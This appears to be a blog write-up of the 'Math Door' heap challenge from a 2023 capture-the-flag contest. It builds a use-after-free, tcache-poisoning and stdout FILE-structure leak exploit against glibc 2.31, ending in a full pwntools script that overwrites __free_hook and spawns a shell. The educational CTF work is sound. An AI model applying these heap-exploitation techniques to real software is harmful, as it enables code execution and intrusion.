---
title: "Taking a leak"
item_image: https://github.com/arget13/arget13.github.io/raw/master/images/wrench.jpg
---
<link rel="stylesheet" href="/style.css">
<style>
.page-header
{
    background-image: url('https://github.com/arget13/arget13.github.io/raw/master/images/wrench.jpg');
    background-position: center;
    background-size: cover;
}
</style>

No greeting, no nothing, quick, follow me to IDA where you will find one of the smallest heap challenges you'll ever see, present in the **Cyberapocalypse 2023** CTF, [**Math Door**](https://github.com/arget13/arget13.github.io/raw/master/files/math_door.tar.xz).
```c
int main()
{
    setup(); // setvbuf() for stdin, out and err
    while(1)
    {
        puts("1. Create \n2. Delete \n3. Add value \nAction: ");
        switch(read_int())
        {
            case 1:
                create();
                break;
            case 2:
                delete()
                break;
            case 3:
                math()
                break;
            default:
                puts("Invalid action!");
        }
}

void create()
{
    if(counter > 64)
        return puts("Max amount of hieroglyphs reached.");
    else
    {
        chunks[counter] = malloc(24);
        printf("Hieroglyph created with index %i.\n", counter++);
    }
}

void delete()
{
    unsigned int idx; // [rsp+Ch] [rbp-4h]

    puts("Hieroglyph index:");
    idx = read_int();
    if(idx < counter)
        free(chunks[idx]);
    else
        puts("That hieroglyph doens't exist.");
}

void math()
{
    unsigned int idx; // [rsp+Ch] [rbp-24h]
    __int64 values[3]; // [rsp+10h] [rbp-20h] BYREF

    memset(values, 0, sizeof(values));
    puts("Hieroglyph index:");
    idx = read_int();
    if(idx <= counter)
    {
        puts("Value to add to hieroglyph:");
        read(0, values, 24);
        chunks[idx][0] += values[0];
        chunks[idx][1] += values[1];
        chunks[idx][2] += values[2];
    }
    else
        puts("That hieroglyph doens't exist.");
}

```

## sƃnq (and a broad analysis)
We can see that the program is very simple, as is the main bug: a UAF in `delete()`. After `free()`ing a chunk there's no information stored about the new status of that chunk (*e. g.* setting it to NULL). We'd consider another bug of uninitialized memory in `create()` since the chunks aren't `memset()` before they are used.

The function `math()` is peculiar because it doesn't let us store information as it is in a chunk, it rather allows us to increment independently the three integers that each chunk hold.

We may also contemplate the utter **lack of ways to leak** any address of anything *at all*.

## Freeing then using (as rude as it sounds)
So we can start easy. All chunks are of size 0x20 so when `free()`d they'll go to the tcache's first bin. We are facing glibc 2.31, let's see how tcache chunks look like here.
```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;
```
Ok, they added a `key` field used to detect double frees, well, with the UAF we can overwrite that key and forget about it.

Let's address first the obvious, we can exploit the UAF to make a chunk in the tcache point to the header of another chunk (or maybe to its own) in order to alter that chunk's size.
```python
def create():
    p.sendafter(b"Action: \n", b"1")
def delete(idx):
    p.sendafter(b"Action: \n", b"2")
    p.sendafter(b"index:\n", bytes(str(idx), 'utf-8'))
def edit(idx, data):
    p.sendafter(b"Action: \n", b"3")
    p.sendafter(b"index:\n", bytes(str(idx), 'utf-8'))
    p.readuntil(b"hieroglyph:\n")
    p.send(data)

create()
create()
create() # idx = 2, we'll overwrite size of this chunk
delete(1)
delete(0) # Now chunk #0 points to chunk with index 1

# UAF to make fwd point to chunk #2's header
edit(0, p64(0x10) + p64(0) + p64(0))

create()
create() # idx = 4, malloc() returns a pointer to chunk #2's header
```
Now let's study what size we want that chunk to be. It is undeniable that we want a pointer to the libc, maybe we can't leak it but we'll see how to use it when we get it, ok? If we want a chunk with its `fwd` field pointing to the libc we need a chunk in a bin with circular linking, *i. e.* **unsorted bin**.

## Grab my hand, son, I'm taking you to a better place, the unsorted bin
Well, that's easy, we could use a size larger than the maximum for tcache, `0x410`, which is also larger than fastbin's, and prevent our chunk from going to either. But there's a slight problem, when we `free()` this chunk it will be checked if it's actually in use, and the way it knows it is by going to the next chunk in memory and seeing its `PREV_INUSE` bit.
```c
    nextchunk = chunk_at_offset(p, size);
    // ...
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      malloc_printerr ("double free or corruption (!prev)");
```
Now, our chunk plus a size of `0x410 - 0x8` will fall somewhere in the top chunk, where there will surely be a NULL pointer. We can solve this by creating several chunks until one is placed there but, given that we can only create `0x20` sized chunks, that would take 32 allocations. And that's alright, the program limits us to 64 and we won't need many more, but I would rather keep things civilized and minimize the number of allocations.

So what I'm going to do is use a size of `0xa0`, larger than maxfast, and to keep it from going to the tcache I'm going to fill the tcache. With a size of `0xa0` we only need four allocations, and one extra to separate our chunk from the top chunk (otherwise they would just be merged instead of having our chunk placed in the unsorted bin).

One last thing, when a chunk is taken from the tcache its `key` field is set to NULL —which makes sense since that field is a measure to detect if a chunk is already free, duh.
```c
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  e->key = NULL;
  return (void *) e;
}
```
Right, the size of our chunk #2 will be chunk #4's `key` field, so after the fourth allocation we'll have a chunk #2 of size `0` xD, therefore we need to add `0xa1` to the size (notice the PREV_INUSE bit set because we don't want our chunk consolidating backwards), instead of only `0x80`, which is what we'd add if the chunk still had `0x21` as size.
```python
# Create a chunk with PREV_INUSE set for our chunk that we'll make of size 0xa0
# Add one chunk extra to prevent it from coalescing with the top chunk
for _ in range(5):
    create()

# Make the chunk #2 of size > maxfast (e. g. 0xa0)
edit(4, p64(0) + p64(0xa1) + p64(0))

# Fill the tcache bin by freeing seven times the same chunk
for _ in range(7):
    delete(2)
    edit(2, p64(0) + p64(1) + p64(0)) # Prevent double free detection

# Free one more time and send it to the unsorted bin
delete(2)
```
And indeed we can see that everything happens as intended, we have successfully placed a chunk in the unsorted bin, and now it has a couple of pointers to the libc.
```
gef➤  heap bins unsorted
─────────────────── Unsorted Bin for arena '*0x7f530e48fb80' ───────────────────
[+] unsorted_bins[0]: fw=0x55f089d012d0, bk=0x55f089d012d0
 →   Chunk(addr=0x55f089d012e0, size=0xa0, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
gef➤  x/2gx 0x55f089d012e0
0x55f089d012e0: 0x00007f530e48fbe0  0x00007f530e48fbe0
gef➤  p (void*)&__free_hook - 0x00007f530e48fbe0
$2 = (void *) 0x2268
```
If we added to that pointer `0x2268` we would make our chunk point to `_free_hook`. But there's first another problem, when we allocate this chunk from the unsorted bin a couple of checks are going to catch us.
```c
          mchunkptr next = chunk_at_offset (victim, size);
          if (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)
              || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
            malloc_printerr ("malloc(): invalid next size (unsorted)");
          if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
            malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
          if (__glibc_unlikely (bck->fd != victim)
              || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
            malloc_printerr ("malloc(): unsorted double linked list corrupted");
          if (__glibc_unlikely (prev_inuse (next)))
            malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");
```
So, for starters, we'd need in `__free_hook - 8` a valid chunk size, which we haven't (we have a NULL pointer there), and there's nothing we can do about it, so that alone makes impossible for us to get that sweet `__free_hook` through unsorted bin.

## Mom, where do chunks come from?
Ok, we can put a chunk in the unsorted bin, make it point to wherever we want in the libc, and then pick it up from the tcache, which won't trigger this checks. And this only requires us to place the chunk in the tcache before changing its size to 0xa0.
```python
create()
create()
create() # idx = 2, we'll overwrite size of this chunk
delete(1)
delete(0) # Now chunk #0 points to chunk with index 1

# UAF to make fwd point to chunk #2's header
edit(0, p64(0x10) + p64(0) + p64(0))

create()
create() # idx = 4, malloc() returns a pointer to chunk #2's header

# Create a chunk with PREV_INUSE set for our chunk that we'll make of size 0xa0
# Add one chunk extra to prevent it from coalescing with the top chunk
for _ in range(5):
    create()

### Keep a pointer to our chunk in the tcache's 0x20 bin
# Make the chunk #2 of size = 0x20 (size gets zeroed when allocating chunk #4)
edit(4, p64(0) + p64(0x21) + p64(0))
delete(2)
edit(2, p64(0) + p64(1) + p64(0)) # Prevent double free detection

# Make the chunk #2 of size > maxfast (e. g. 0xa0)
edit(4, p64(0) + p64(0x80) + p64(0))

# Fill the tcache bin by freeing seven times the same chunk
for _ in range(7):
    delete(2)
    edit(2, p64(0) + p64(1) + p64(0)) # Prevent double free detection

# Free one more time and send it to the unsorted bin
delete(2)

# Make fwd pointer in our chunk (which points to libc) point to __free_hook
edit(2, p64(0x2268) + p64(0) * 2)

create()
create() # idx = 11, should return a pointer to __free_hook
```
But it doesn't work. Studying the state of the heap right before the last two `create()` in the code above the problem becomes evident.
```
gef➤  heap bins tcache
──────────────────────────── Tcachebins for thread 1 ───────────────────────────
Tcachebins[idx=0, size=0x20] count=1  ←  Chunk(addr=0x55d41e90d2e0, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x7f2965f59e48, size=0x0, flags=) 
Tcachebins[idx=8, size=0xa0] count=7  ←  Chunk(addr=0x55d41e90d2e0, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x7f2965f59e48, size=0x0, flags=) 
gef➤  heap bins unsorted
─────────────────── Unsorted Bin for arena '*0x7f2965f57b80' ───────────────────
[+] unsorted_bins[0]: fw=0x55d41e90d2d0, bk=0x55d41e90d2d0
 →   Chunk(addr=0x55d41e90d2e0, size=0xa0, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
gef➤  x/gx 0x7f2965f59e48
0x7f2965f59e48 <__free_hook>:   0x0000000000000000
```
Even though we have our chunk in the tcache's 0x20 bin pointing to `__free_hook`, the counter of the tcache's 0x20 bin is only 1. After allocating our chunk (removing it from the tcache) that counter will be decremented to zero and the next allocation will ignore the tcache (and try to allocate the chunk from the unsorted bin, dying miserably in a segmentation fault<span id="1_"><a href="#1"><sup>1</sup></a>, *heaps* of entrails surrounding its cold and stiff corpse; the kernel, only moments away from finding it, will heave a sigh at the sight and start cleaning the muddle with the skill of someone who has had to do it already too many times, a single tear dangling from the chin).

Fair enough. Placing our chunk twice in the tcache in order to increment the counter to two would fix this.
```python
# Create a chunk with PREV_INUSE set for our chunk that we'll make of size 0xa0
# Add one chunk extra to prevent it from coalescing with the top chunk
for _ in range(5):
    create()

### Keep a pointer to our chunk in the tcache's 0x20 bin
# Make the chunk #2 of size = 0x20 (size gets zeroed when allocating chunk #4)
edit(4, p64(0) + p64(0x21) + p64(0))
delete(2)
edit(2, p64(0) + p64(1) + p64(0)) # Prevent double free detection
delete(2) # counter = 2
edit(2, p64(0) + p64(1) + p64(0))

# Make the chunk #2 of size > maxfast (e. g. 0xa0)
edit(4, p64(0) + p64(0x80) + p64(0))
```
By editing the contents of the last allocated chunk we would be overwriting `__free_hook`, and thus the next call to `free()` would jump to whatever address we place there.
```python
# Make fwd pointer in our chunk (which points to libc) point to __free_hook
edit(2, p64(0x2268) + p64(0) * 2)

create()
create() # idx = 11, should return a pointer to __free_hook
edit(11, p64(0x3f616973696c6f70) + p64(0) * 2)
```
```
$rax   : 0x3f616973696c6f70 ("polisia?"?)
[...]
 → 0x7f0fae43d771 <free+161>       jmp    rax
```
We control the program counter, yay! But this is nothing, we still have a handful of nothing if we don't get a leak. So let me please stand up, stretch my legs a little and go take a leak.

## Taking a leak
With the possibility of leaking an address thrown out of the window we may as well throw the challenge after it (or preferably ourselves). But I don't know, maybe I am too manly (heh no, I'm not), but I say that if we can't find a leak \*grabs a wrench\*, we should make one ourselves.

While growing up one would always hear stories, legends, myths. As a wide-eyed kid listened, not knowing whether to believe or not, details were attentively collected, hidden pieces of information. Weird houses, SROP, ret2dlresolve, JOP, far returns... and the one I'm going to talk about today, `FILE` structures overwriting.

### Glibc streams internals
So when growing up in the pwn world I heard people talking about abusing `FILE` structures, but never had the need to use them until now, so I decided to go and see the Glibc code for all this stuff, streams and all. The following is the (main part of the) definition for the `struct FILE`.
```c
/* The tag name of this struct is _IO_FILE to preserve historic
   C++ mangled names for functions taking FILE* arguments.
   That name should not be used in new code.  */
struct _IO_FILE
{
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;   /* Current read pointer */
  char *_IO_read_end;   /* End of get area. */
  char *_IO_read_base;  /* Start of putback+get area. */
  char *_IO_write_base; /* Start of put area. */
  char *_IO_write_ptr;  /* Current put pointer. */
  char *_IO_write_end;  /* End of put area. */
  char *_IO_buf_base;   /* Start of reserve area. */
  char *_IO_buf_end;    /* End of reserve area. */

// [...]
};
```
From here I want you to keep a couple of ideas.
- The field `_flags` store information about directionality of the stream, type of buffering and things like that. `stdout` has the following flags:
    - `_IO_USER_BUF`, `_IO_UNBUFFERED`, `_IO_NO_READS`, `_IO_LINKED`, `_IO_CURRENTLY_PUTTING`, `_IO_IS_FILEBUF`.
- The next eight pointers point to or inside the buffers used for writing or reading from the stream.
    - The `*_base` pointers point to the buffer itself.
    - The `*_end` pointers point to the end of the buffer.
    - The `*_ptr` pointers point to the place where new data can be added to or drawn from.

Right after we edit the structure the program will execute the call to `puts("1. Create...")` —keep in mind that the string cointains newlines. `puts()` (`_IO_puts()` for close friends) has the following code,
```c
int
_IO_puts (const char *str)
{
  int result = EOF;
  size_t len = strlen (str);
  _IO_acquire_lock (stdout);

  if ((_IO_vtable_offset (stdout) != 0
       || _IO_fwide (stdout, -1) == -1)
      && _IO_sputn (stdout, str, len) == len
      && _IO_putc_unlocked ('\n', stdout) != EOF)
    result = MIN (INT_MAX, len + 1);

  _IO_release_lock (stdout);
  return result;
}
```
which I know doesn't answer many questions (or any at all), but hey, this is glibc, this isn't supposed to be easy. What we care the most about is the call to `_IO_sputn()`, used to add the string to the buffer (which will also trigger the flushing of the buffer).

`_IO_sputn()` is, in the end (and I had to track through a lot of macros and shit), a call to
```c
size_t
_IO_new_file_xsputn (FILE *f, const void *data, size_t n)
{
  const char *s = (const char *) data;
  size_t to_do = n;
  int must_flush = 0;
  size_t count = 0;

  if (n <= 0)
    return 0;
  /* This is an optimized implementation.
     If the amount to be written straddles a block boundary
     (or the filebuf is unbuffered), use sys_write directly. */

  /* First figure out how much space is available in the buffer. */
  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
    {
      count = f->_IO_buf_end - f->_IO_write_ptr;
      if (count >= n)
        {
          const char *p;
          for (p = s + n; p > s; )
            {
              if (*--p == '\n')
                {
                  count = p - s + 1;
                  must_flush = 1;
                  break;
                }
            }
        }
    }
    // [...]
  /* Then fill the buffer. */
  if (count > 0)
    {
      if (count > to_do)
        count = to_do;
      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
      s += count;
      to_do -= count;
    }
  if (to_do + must_flush > 0)
    {
      size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
      // [...]
    }
  // [...]
}
```
In case there was a newline, the string is copied to the buffer till its last newline and then, if the string cointained at least one newline, the buffer is flushed through `_IO_OVERFLOW()`.

`_IO_OVERFLOW()` takes us here.
```c
int
_IO_new_file_overflow (FILE *f, int ch)
{
  // [...]
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
                         f->_IO_write_ptr - f->_IO_write_base);
  // [...]
}
```
which gets to (this is so **fun**!)
```c
int
_IO_new_do_write (FILE *fp, const char *data, size_t to_do)
{
  return (to_do == 0
          || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)

static size_t
new_do_write (FILE *fp, const char *data, size_t to_do)
{
  size_t count;
  // [...]
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      off64_t new_pos
        = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
        return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  // [...]
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  // [...]
  return count;
}
```
Huh, we want to avoid entering that `if` since `seek()`ing through `stdout` would return an error and `new_pos == _IO_pos_BAD` would be true (and this function would return without calling to `write()`). It's also nice to notice that this function resets `_IO_write_base` and `_IO_read_end` (through `_IO_setg()`).

And finally we have `_IO_SYSWRITE()`, which in essence is just a call to `write()`.
```c
ssize_t
_IO_new_file_write (FILE *f, const void *data, ssize_t n)
{
  ssize_t to_do = n;
  while (to_do > 0)
    {
      ssize_t count = (__builtin_expect (f->_flags2
                                         & _IO_FLAGS2_NOTCANCEL, 0)
                           ? __write_nocancel (f->_fileno, data, to_do)
                           : __write (f->_fileno, data, to_do));
      if (count < 0)
        {
          f->_flags |= _IO_ERR_SEEN;
          break;
        }
      to_do -= count;
      data = (void *) ((char *) data + count);
    }
  n -= to_do;
  if (f->_offset >= 0)
    f->_offset += n;
  return n;
}
```
Boy, reading the glibc is exhausting. I need to read something that negates all these effects, idk, Fifty Shades of Grey maybe?

So if we are able to change where `_IO_write_base` points to in `stdout`'s structure we would be able to leak the contents of wherever place we want.<span id="2_"><a href="#2"><sup>2</sup></a> We need to remember that `_IO_read_end` must point to the same place as `_IO_write_base`. And we also know that we don't need to worry about breaking anything due to leaving them pointing to some weird place since they will be reset by `new_do_write()`.

### Growing up
So instead of getting a pointer to `__free_hook` we'll get a pointer to `stdout`'s `_IO_read_end` field, and overwrite it and `_IO_write_base` as well. In the process of taking that pointer from the tcache we will unavoidably make NULL the `_IO_read_base` field, but it is never going to be used for `stdout`, so don't think about it.
```
gef➤  x/gx &stdout
0x555555558020 <stdout@@GLIBC_2.2.5>:   0x00007ffff7fc26a0
gef➤  x/gx 0x00007ffff7fc26a0
0x7ffff7fc26a0 <_IO_2_1_stdout_>:       0x00000000fbad2887
gef➤  
0x7ffff7fc26a8 <_IO_2_1_stdout_+8>:     0x00007ffff7fc2723
gef➤  
0x7ffff7fc26b0 <_IO_2_1_stdout_+16>:    0x00007ffff7fc2723 // We want edit this
gef➤  p (void*)&__free_hook - 0x7ffff7fc26b0
$1 = (void *) 0x1798
gef➤  p 0x2268-0x1798
$2 = 0xad0
gef➤  x/gx 0x00007ffff7fc2723 - 0x203
0x7ffff7fc2520: 0x00007ffff7f8afd9 // An address to leak, for example
```
```python
create()
create()
create() # idx = 2, we'll overwrite size of this chunk
delete(1)
delete(0) # Now chunk #0 points to chunk with index 1

# UAF to make fwd point to chunk #2's header
edit(0, p64(0x10) + p64(0) + p64(0))

create()
create() # idx = 4, malloc() returns a pointer to chunk #2's header

# Create a chunk with PREV_INUSE set for our chunk that we'll make of size 0xa0
# Add one chunk extra to prevent it from coalescing with the top chunk
for _ in range(5):
    create()

### Keep a pointer to our chunk in the tcache's 0x20 bin
# Make the chunk #2 of size = 0x20 (size gets zeroed when allocating chunk #4)
edit(4, p64(0) + p64(0x21) + p64(0))
delete(2)
edit(2, p64(0) + p64(1) + p64(0)) # Prevent double free detection
delete(2) # counter = 2
edit(2, p64(0) + p64(1) + p64(0))

# Make the chunk #2 of size > maxfast (e. g. 0xa0)
edit(4, p64(0) + p64(0x80) + p64(0))

# Fill the tcache bin by freeing seven times the same chunk
for _ in range(7):
    delete(2)
    edit(2, p64(0) + p64(1) + p64(0)) # Prevent double free detection

# Free one more time and send it to the unsorted bin
delete(2)

# Make fwd pointer in our chunk (which points to libc) point to stdout's struct
edit(2, p64(0xad0) + p64(0) * 2)

create()
create() # idx = 11, should return a pointer to stdout's struct

# Edit stdout and leak!
edit(11, p64(2**64 - 0x203) + p64(0) + p64(2**64 - 0x203))
libc = int.from_bytes(p.read(6), "little") - 0x1b5fd9
print("Libc: 0x%012x" % libc)
```
And now we get our sweet sweet address!
```
❯ python x.py 
[+] Starting local process './math-door': pid 35551
Libc: 0x7fafe98e8000
```

## How not to crash a program
See, manipulating the heap in its current "suboptimal" state is at least tricky, but hold on, there is an interesting thing going on here
```
gef➤  heap bins tcache
──────────────────────────── Tcachebins for thread 1 ───────────────────────────
Tcachebins[idx=0, size=0x20] count=0  ←  Chunk(addr=0x7f2d2e849723, size=0xfffffffff8, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x84a7e0000000000a]
```
after allocating the chunk in `_IO_read_end`, `malloc()` has placed the pointer where `_IO_read_end` was pointing to in the tcache! But in order to use it we need that counter to be one. No problem, when we increment earlier the counter to two we can increment it to three instead :)

We only need to free one of the healthy chunks we already have allocated, it will be placed in the tcache, with its `next` pointing to the libc again (in this case to `0x7f2d2e849723`), and we can edit that through the UAF to make it point to `__free_hook`.

```python
from pwn import *

def create():
    p.sendafter(b"Action: \n", b"1")
def delete(idx):
    p.sendafter(b"Action: \n", b"2")
    p.sendafter(b"index:\n", bytes(str(idx), 'utf-8'))
def edit(idx, data):
    p.sendafter(b"Action: \n", b"3")
    p.sendafter(b"index:\n", bytes(str(idx), 'utf-8'))
    p.readuntil(b"hieroglyph:\n")
    p.send(data)

p = process("./math-door")
# p = remote("165.232.108.200", 31709)

create()
create()
create() # idx = 2, we'll overwrite size of this chunk
delete(1)
delete(0) # Now chunk #0 points to chunk with index 1

# UAF to make fwd point to chunk #2's header
edit(0, p64(0x10) + p64(0) + p64(0))

create()
create() # idx = 4, malloc() returns a pointer to chunk #2's header

# Create a chunk with PREV_INUSE set for our chunk that we'll make of size 0xa0
# Add one chunk extra to prevent it from coalescing with the top chunk
for _ in range(5):
    create()

### Keep a pointer to our chunk in the tcache bin for 0x20
# Make the chunk #2 of size = 0x20 (size gets zeroed when allocating)
edit(4, p64(0) + p64(0x21) + p64(0))
# And send it to 0x20 bin of tcache
delete(2) # Counter = 1
edit(2, p64(0) + p64(1) + p64(0)) # Prevent double free detection
delete(2) # Counter = 2
edit(2, p64(0) + p64(1) + p64(0))
delete(2) # Counter = 3
edit(2, p64(0) + p64(1) + p64(0))

# Make the chunk #2 of size > maxfast (e. g. 0xa0)
edit(4, p64(0) + p64(0x80) + p64(0))

# Fill the tcache bin by freeing seven times the same chunk
for _ in range(7):
    delete(2)
    edit(2, p64(0) + p64(1) + p64(0)) # Prevent double free detection
# Free another time and send it to the unsorted bin
delete(2)

# Make fwd pointer in our chunk (which points to libc) point to stdout's struct
edit(2, p64(0xad0) + p64(0) * 2)

create()
create() # idx = 11, should return a pointer to stdout's struct

# Edit stdout and leak!
edit(11, p64(2**64 - 0x203) + p64(0) + p64(2**64 - 0x203))
libc = int.from_bytes(p.read(6), "little") - 0x1b5fd9
system = libc + 0x52290
print("Libc: 0x%012x" % libc)

delete(6)
# 0x20 bin already pointing to fake chunk in libc
# because the "chunk" allocated in idx 11 pointed to another place in libc
edit(6, p64(0x1725 - 8) + p64(0) * 2) # Fd points to __free_hook - 8

create()
create() # idx = 13, pointer to __free_hook - 8

edit(13, p64(0x68732f6e69622f) + p64(system) + p64(0))
delete(13) # Trigger ...

p.interactive() # ... and shell
```
```
❯ python a.py
[+] Starting local process './math-door': pid 37337
Libc: 0x7f87008fd000
[*] Switching to interactive mode
$ whoami
arget
```
Now, I have been sitting for too long, I *really* need to take a leak.

Y.

> Any man's death diminishes me, because I am involved in mankind, and therefore never send to know for whom the bells tolls; it tolls for thee.  

<figcaption>— John Donne, <cite>Meditation XVII</cite>.</figcaption>

## Notes
<span id="1"><a href="#1_"><sup>1</sup></a> Because trying to unlink the chunk, `malloc()` will dereference its `bck` pointer, which we made NULL when we took it from the tcache (remember the `key` field?).</span>

<span id="2"><a href="#2_"><sup>2</sup></a> As long as it is at an address lower than `_IO_write_ptr` or we would try to `write()` a negative number of bytes, *i. e.* a large amount.</span>
